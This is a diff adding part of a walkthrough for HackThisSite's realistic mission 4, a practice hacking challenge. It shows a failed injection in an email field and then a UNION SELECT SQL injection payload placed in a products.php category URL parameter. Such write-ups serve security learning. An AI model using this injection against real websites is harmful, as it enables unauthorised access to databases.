@@ -1,0 +1,11 @@
+Since we are supposed to be using sql injections, we try to enter sql code to the 'add email' field. This doesn't work though, only outputting:
+Error inserting into table "email"! Email not valid! Please contact an administrator of Fischer's
+
+However, this gives us the name of the table we are interested in: 'email'.
+
+Browsind the website we discover there is another way to interact with the database: the url of the 'products' pages. Adding
+union select * from products
+like so:
+https://www.hackthissite.org/missions/realistic/4/products.php?category=2%20union%20select%20*%20from%20products
+leads to a website that displays all products. So we are on the right track.
+
